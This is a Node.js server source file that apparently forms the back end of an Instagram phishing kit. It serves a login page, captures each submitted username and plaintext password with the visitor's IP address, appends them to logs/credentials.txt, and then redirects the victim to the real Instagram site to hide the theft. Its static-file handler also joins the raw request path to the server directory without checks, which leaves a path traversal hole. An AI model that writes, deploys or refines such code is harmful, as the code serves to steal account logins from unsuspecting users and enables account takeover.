const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const querystring = require('querystring');

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir);
}

// Create the HTTP server
const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url);
  const pathname = parsedUrl.pathname;
  
  console.log(`${req.method} request for ${pathname}`);

  // Handle requests
  if (req.method === 'GET' && (pathname === '/' || pathname === '/index.html')) {
    // Serve the HTML file
    fs.readFile(path.join(__dirname, 'index.html'), (err, data) => {
      if (err) {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('Internal Server Error');
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(data);
    });
  } else if (req.method === 'POST' && pathname === '/login') {
    let body = '';
    
    // Collect data from the request
    req.on('data', (chunk) => {
      body += chunk.toString();
      
      // Prevent potential large requests
      if (body.length > 1e6) {
        body = '';
        res.writeHead(413, { 'Content-Type': 'text/plain' });
        res.end('Request Entity Too Large');
        req.socket.destroy();
      }
    });
    
    // Process the form submission
req.on('end', () => {
  console.log('Form data received:', body);
  const formData = querystring.parse(body);
  const username = formData.username || 'unknown';
  const password = formData.password || 'unknown';
  const timestamp = new Date().toISOString();

  // Extract IP address
  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
  if (ip.startsWith("::ffff:")) {
    ip = ip.split(':').pop();
  }

  // Create log entry
  const logEntry = `[${timestamp}] IP: ${ip}, Username: ${username}, Password: ${password}\n`;

  // Append to log file
  fs.appendFile(path.join(logsDir, 'credentials.txt'), logEntry, (err) => {
    if (err) {
      console.error('Error writing to log file:', err);
      res.writeHead(500, { 'Content-Type': 'text/plain' });
      res.end('Internal Server Error');
      return;
    }

    console.log('Credentials logged successfully');

    // Redirect to Instagram
    res.writeHead(302, { 'Location': 'https://www.instagram.com' });
    res.end();
  });
});

  } else {
    // Handle other static files (CSS, JS, images)
    const fileExtension = String(path.extname(pathname)).toLowerCase();
    const mimeTypes = {
      '.html': 'text/html',
      '.css': 'text/css',
      '.js': 'text/javascript',
      '.png': 'image/png',
      '.jpg': 'image/jpeg',
      '.jpeg': 'image/jpeg',
      '.gif': 'image/gif',
      '.svg': 'image/svg+xml'
    };
    
    const contentType = mimeTypes[fileExtension] || 'application/octet-stream';
    
    // Check if the file exists
    const filePath = path.join(__dirname, pathname);
    fs.readFile(filePath, (err, data) => {
      if (err) {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
        return;
      }
      
      res.writeHead(200, { 'Content-Type': contentType });
      res.end(data);
    });
  }
});

// Start the server
const port = 5000;
server.listen(port, '0.0.0.0', () => {
  console.log(`Server running at http://0.0.0.0:${port}`);
});